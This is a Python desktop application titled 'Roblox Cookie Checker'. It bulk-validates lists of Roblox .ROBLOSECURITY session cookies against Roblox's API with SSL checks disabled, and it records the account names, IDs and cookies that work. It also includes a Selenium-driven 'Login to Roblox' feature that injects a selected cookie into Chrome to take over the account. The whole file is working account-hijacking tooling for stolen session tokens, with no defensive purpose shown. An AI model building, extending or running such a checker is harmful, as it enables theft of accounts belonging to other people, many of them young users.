import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import threading
import asyncio
import aiohttp
from datetime import datetime
import os
import webbrowser
import pyperclip
from ttkthemes import ThemedTk
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

class RobloxChecker:
    def __init__(self):
        self.root = ThemedTk(theme="equilux")
        self.root.title("Roblox Cookie Checker TTW.CODE")
        self.root.configure(bg='#1a1a1a')
        
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        window_width = int(screen_width * 0.45)
        window_height = int(screen_height * 0.45)
        x = (screen_width - window_width) // 2
        y = (screen_height - window_height) // 2
        self.root.geometry(f"{window_width}x{window_height}+{x}+{y}")
        self.root.resizable(True, True)

        try:
            from ctypes import windll
            windll.shcore.SetProcessDpiAwareness(1)
        except:
            pass
        
        self.results_folder = "checker_results"
        if not os.path.exists(self.results_folder):
            os.makedirs(self.results_folder)
            
        self.cookies = []
        self.valid_cookies = []
        self.is_checking = False
        self.total_cookies_loaded = 0
        
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        
        self.setup_styles()
        self.create_gui()
        
        self.clear_cache()

    def clear_cache(self):
        cache_dir = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp")
        try:
            for filename in os.listdir(cache_dir):
                if filename.startswith("roblox_cookie_"):
                    filepath = os.path.join(cache_dir, filename)
                    try:
                        os.remove(filepath)
                    except:
                        pass
        except:
            pass

    def setup_styles(self):
        style = ttk.Style()
        
        bg_color = '#1a1a1a'
        fg_color = '#f0f0f0'
        accent_color = '#4a9eff'
        button_bg = '#2a2a2a'
        button_hover = '#3a3a3a'
        
        style.configure("Modern.TButton",
                       padding=8,
                       font=("Segoe UI Semibold", 9),
                       background=button_bg,
                       foreground=fg_color,
                       borderwidth=0)
        
        style.map("Modern.TButton",
                 background=[('active', button_hover)],
                 foreground=[('active', fg_color)])
        
        style.configure("Stats.TLabel",
                       font=("Segoe UI", 9),
                       foreground=fg_color,
                       background=bg_color)
        
        style.configure("Title.TLabel",
                       font=("Segoe UI Semibold", 11),
                       foreground=accent_color,
                       background=bg_color)
        
        style.configure("Treeview",
                       font=("Segoe UI", 9),
                       rowheight=25,
                       background='#1d1d1d',
                       foreground=fg_color,
                       fieldbackground='#1d1d1d')
        
        style.configure("Treeview.Heading",
                       font=("Segoe UI Semibold", 9),
                       background='#252525',
                       foreground=fg_color,
                       relief="flat")
        
        style.map("Treeview",
                 background=[('selected', accent_color)],
                 foreground=[('selected', 'white')])
        
        style.map("Treeview.Heading",
                 background=[('active', '#303030')],
                 relief=[('active', 'flat')])
        
        style.configure("TFrame", background=bg_color)
        style.configure("TLabelframe", background=bg_color, foreground=fg_color)
        style.configure("TLabelframe.Label", background=bg_color, foreground=fg_color)
        
        style.configure("Horizontal.TProgressbar",
                       background=accent_color,
                       troughcolor='#252525',
                       borderwidth=0,
                       thickness=6)

    def create_gui(self):
        main_frame = ttk.Frame(self.root, style="TFrame")
        main_frame.pack(fill="both", expand=True, padx=12, pady=8)

        header_frame = ttk.Frame(main_frame, style="TFrame")
        header_frame.pack(fill="x", pady=(0, 8))
        
        ttk.Label(header_frame,
                 text="Roblox Cookie Checker TTW.CODE",
                 style="Title.TLabel").pack(side="left")

        control_frame = ttk.Frame(main_frame, style="TFrame")
        control_frame.pack(fill="x", pady=(0, 8))

        btn_frame = ttk.Frame(control_frame, style="TFrame")
        btn_frame.pack(fill="x")

        buttons = [
            ("Upload", self.upload_file, "⬆️"),
            ("Start", self.start_checking, "▶️"),
            ("Save", self.save_results, "💾"),
            ("Clear", self.clear_all, "🗑️")
        ]

        for text, command, icon in buttons:
            btn = ttk.Button(btn_frame,
                           text=f"{icon} {text}",
                           command=command,
                           style="Modern.TButton",
                           width=10)
            if text == "Start":
                self.start_button = btn
            btn.pack(side="left", padx=4)

        progress_frame = ttk.Frame(main_frame, style="TFrame")
        progress_frame.pack(fill="x", pady=(0, 8))
        
        self.progress_var = tk.DoubleVar()
        self.progress = ttk.Progressbar(progress_frame,
                                      variable=self.progress_var,
                                      mode="determinate",
                                      style="Horizontal.TProgressbar")
        self.progress.pack(fill="x")

        result_frame = ttk.Frame(main_frame, style="TFrame")
        result_frame.pack(fill="both", expand=True)

        tree_container = ttk.Frame(result_frame, style="TFrame")
        tree_container.pack(fill="both", expand=True, padx=1)

        self.tree = ttk.Treeview(tree_container,
                                columns=("Username", "Display Name", "Created", "UserID", "Cookie"),
                                show="headings",
                                style="Treeview")

        total_width = 400
        widths = {
            "Username": int(total_width * 0.15),
            "Display Name": int(total_width * 0.15),
            "Created": int(total_width * 0.15),
            "UserID": int(total_width * 0.15),
            "Cookie": int(total_width * 0.4)
        }

        for col, width in widths.items():
            self.tree.heading(col, text=col)
            self.tree.column(col, width=width)

        y_scrollbar = ttk.Scrollbar(tree_container,
                                  orient="vertical",
                                  command=self.tree.yview)
        x_scrollbar = ttk.Scrollbar(result_frame,
                                  orient="horizontal",
                                  command=self.tree.xview)
        
        self.tree.configure(yscrollcommand=y_scrollbar.set,
                          xscrollcommand=x_scrollbar.set)

        y_scrollbar.pack(side="right", fill="y")
        self.tree.pack(side="left", fill="both", expand=True)
        x_scrollbar.pack(side="bottom", fill="x")

        self.status_var = tk.StringVar(value="Ready")
        status_frame = ttk.Frame(self.root, style="TFrame")
        status_frame.pack(side="bottom", fill="x", padx=2, pady=2)
        
        status_bar = ttk.Label(status_frame,
                             textvariable=self.status_var,
                             style="Stats.TLabel",
                             padding=(6, 4))
        status_bar.pack(side="left")

        self.create_context_menu()
        self.tree.bind("<Button-3>", self.show_context_menu)

    def create_context_menu(self):
        self.context_menu = tk.Menu(self.root, tearoff=0, bg='#2b2b2b', fg='white')
        self.context_menu.add_command(label="Login to Roblox", command=self.login_to_roblox)
        self.context_menu.add_separator()
        self.context_menu.add_command(label="Copy Username", command=lambda: self.copy_column(0))
        self.context_menu.add_command(label="Copy Display Name", command=lambda: self.copy_column(1))
        self.context_menu.add_command(label="Copy Created Date", command=lambda: self.copy_column(2))
        self.context_menu.add_command(label="Copy UserID", command=lambda: self.copy_column(3))
        self.context_menu.add_command(label="Copy Cookie", command=lambda: self.copy_column(4))
        self.context_menu.add_separator()
        self.context_menu.add_command(label="View Profile", command=self.view_profile)

    def copy_column(self, column_index):
        selected = self.tree.selection()
        if selected:
            item = selected[0]
            values = self.tree.item(item)["values"]
            if 0 <= column_index < len(values):
                value = str(values[column_index])
                pyperclip.copy(value)
                column_names = ["Username", "Display Name", "Created Date", "UserID", "Cookie"]
                self.status_var.set(f"{column_names[column_index]} copied to clipboard")

    def copy_cookie(self):
        selected = self.tree.selection()
        if selected:
            item = selected[0]
            values = self.tree.item(item)["values"]
            if len(values) > 4:
                pyperclip.copy(values[4])
                self.status_var.set("Cookie copied to clipboard")

    def view_profile(self):
        selected = self.tree.selection()
        if selected:
            item = selected[0]
            values = self.tree.item(item)["values"]
            if len(values) > 3:
                user_id = values[3]
                webbrowser.open(f"https://www.roblox.com/users/{user_id}/profile")

    def show_context_menu(self, event):
        try:
            item = self.tree.identify_row(event.y)
            if item:
                self.tree.selection_set(item)
                self.context_menu.post(event.x_root, event.y_root)
        finally:
            self.context_menu.grab_release()

    async def check_cookie_async(self, session, cookie):
        try:
            headers = {
                "Cookie": f".ROBLOSECURITY={cookie}",
                "Accept": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Referer": "https://www.roblox.com/",
                "Origin": "https://www.roblox.com"
            }
            
            async with session.get(
                "https://users.roblox.com/v1/users/authenticated",
                headers=headers,
                ssl=False,
                timeout=5
            ) as response:
                if response.status == 200:
                    user_data = await response.json()
                    user_id = str(user_data.get("id"))
                    
                    if user_id:
                        async with session.get(
                            f"https://users.roblox.com/v1/users/{user_id}",
                            headers=headers,
                            ssl=False,
                            timeout=5
                        ) as details_response:
                            if details_response.status == 200:
                                details_data = await details_response.json()
                                created_date = "N/A"
                                
                                try:
                                    if "created" in details_data:
                                        created = details_data["created"]
                                        if created.endswith('Z'):
                                            created = created[:-1]
                                            parts = created.split('.')
                                            if len(parts) > 1:
                                                base = parts[0]
                                                ms = parts[1]
                                                ms = ms.ljust(6, '0')[:6]
                                                created = f"{base}.{ms}+00:00"
                                            else:
                                                created = f"{created}+00:00"
                                        created_date = datetime.fromisoformat(created).strftime("%Y-%m-%d")
                                except Exception as e:
                                    print(f"Error parsing date: {str(e)} for date: {created}")
                                
                                return {
                                    "valid": True,
                                    "username": user_data.get("name", "N/A"),
                                    "displayName": details_data.get("displayName", "N/A"),
                                    "created": created_date,
                                    "userid": user_id,
                                    "cookie": cookie
                                }
                
            return {"valid": False, "cookie": cookie}
            
        except Exception as e:
            print(f"Error checking cookie: {str(e)}")
            return {"valid": False, "cookie": cookie}

    async def check_cookies_async(self):
        try:
            timeout = aiohttp.ClientTimeout(total=10)
            connector = aiohttp.TCPConnector(
                ssl=False,
                limit=100,
                force_close=True,
                enable_cleanup_closed=True
            )
            
            async with aiohttp.ClientSession(
                timeout=timeout,
                connector=connector,
                headers={"Connection": "close"}
            ) as session:
                batch_size = 25
                
                for i in range(0, len(self.cookies), batch_size):
                    if not self.is_checking:
                        break
                    
                    batch = self.cookies[i:i + batch_size]
                    valid_cookies = [cookie.strip() for cookie in batch if cookie.strip()]
                    if not valid_cookies:
                        continue
                    
                    tasks = [self.check_cookie_async(session, cookie) for cookie in valid_cookies]
                    
                    try:
                        results = await asyncio.gather(*tasks, return_exceptions=True)
                        valid_results = []
                        
                        for result in results:
                            if isinstance(result, dict) and result.get("valid"):
                                valid_results.append(result)
                        
                        if valid_results:
                            self.root.after(0, lambda: [self.update_tree(r) for r in valid_results])
                        
                        checked = i + len(batch)
                        progress = min((checked / len(self.cookies)) * 100, 100)
                        self.root.after(0, self.update_progress, progress, checked)
                        
                        await asyncio.sleep(0.05)
                        
                    except Exception as e:
                        print(f"Error in batch: {str(e)}")
                        continue
            
            self.root.after(0, self.finish_checking)
            
        except Exception as e:
            print(f"Error in check_cookies_async: {str(e)}")
            self.root.after(0, lambda: self.status_var.set(f"Error: {str(e)}"))
            self.root.after(0, self.finish_checking)

    def update_tree(self, result):
        if result["valid"]:
            self.tree.insert("", "end", values=(
                result["username"],
                result["displayName"],
                result["created"],
                result["userid"],
                result["cookie"]
            ))
            self.valid_cookies.append(result)

    def upload_file(self):
        try:
            file_path = filedialog.askopenfilename(
                filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
            )
            
            if file_path:
                with open(file_path, 'r', encoding='utf-8') as file:
                    new_cookies = [line.strip() for line in file.readlines() if line.strip()]
                    
                self.cookies.extend(new_cookies)
                self.total_cookies_loaded = len(self.cookies)
                
                self.status_var.set(f"Loaded {len(new_cookies)} cookies. Total: {self.total_cookies_loaded}")
                self.start_button.configure(state="normal")
        except Exception as e:
            self.status_var.set(f"Error loading file: {str(e)}")

    def update_progress(self, progress, checked):
        self.progress_var.set(progress)
        self.status_var.set(f"Checking: {checked}/{len(self.cookies)}")

    def finish_checking(self):
        self.is_checking = False
        self.start_button.configure(text="Start", state="normal")
        valid_count = len(self.valid_cookies)
        self.status_var.set(f"Done! Found {valid_count} valid cookies")

    def start_checking(self):
        if not self.cookies:
            self.status_var.set("Please upload cookies first!")
            return
        
        if self.is_checking:
            self.is_checking = False
            self.start_button.configure(text="Start")
            self.status_var.set("Checking stopped")
            return

        self.is_checking = True
        self.start_button.configure(text="Stop")
        self.progress_var.set(0)
        
        threading.Thread(target=lambda: self.loop.run_until_complete(self.check_cookies_async()), 
                       daemon=True).start()

    def save_results(self):
        if not self.valid_cookies:
            self.status_var.set("No valid cookies to save")
            return
            
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(self.results_folder, f"results_{timestamp}.txt")
        
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write("=== Valid Cookies ===\n\n")
                for result in self.valid_cookies:
                    f.write(f"Username: {result['username']}\n")
                    f.write(f"Display Name: {result['displayName']}\n")
                    f.write(f"Created: {result['created']}\n")
                    f.write(f"UserID: {result['userid']}\n")
                    f.write(f"Cookie: {result['cookie']}\n")
                    f.write("-" * 50 + "\n")
            self.status_var.set(f"Saved to: {filename}")
        except Exception as e:
            self.status_var.set(f"Error saving: {str(e)}")

    def clear_all(self):
        for item in self.tree.get_children():
            self.tree.delete(item)
        
        self.cookies = []
        self.valid_cookies = []
        self.total_cookies_loaded = 0
        self.progress_var.set(0)
        self.is_checking = False
        
        self.start_button.configure(text="Start", state="normal")
        self.status_var.set("Cleared all data")

    def login_to_roblox(self):
        selected = self.tree.selection()
        if not selected:
            return
            
        item = selected[0]
        values = self.tree.item(item)["values"]
        if len(values) <= 4:
            return
            
        cookie = values[4]
        username = values[0]
        
        try:
            chrome_options = Options()
            chrome_options.add_argument("--start-maximized")
            chrome_options.add_experimental_option("detach", True) 
            
            driver = webdriver.Chrome(options=chrome_options)
            
            driver.get("https://www.roblox.com/home")
            
            driver.add_cookie({
                "name": ".ROBLOSECURITY",
                "value": cookie,
                "domain": ".roblox.com",
                "path": "/"
            })
            
            driver.refresh()
            
            try:
                WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.CLASS_NAME, "avatar"))
                )
            
                
                self.status_var.set(f"Logged in as {username}")
                driver.get("https://www.roblox.com/home")
                
            except Exception as e:
                print(f"Error waiting for login: {str(e)}")
                driver.quit()
                
        except Exception as e:
            self.status_var.set(f"Error logging in: {str(e)}")
            messagebox.showerror("Login Error", str(e))

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = RobloxChecker()
    app.run()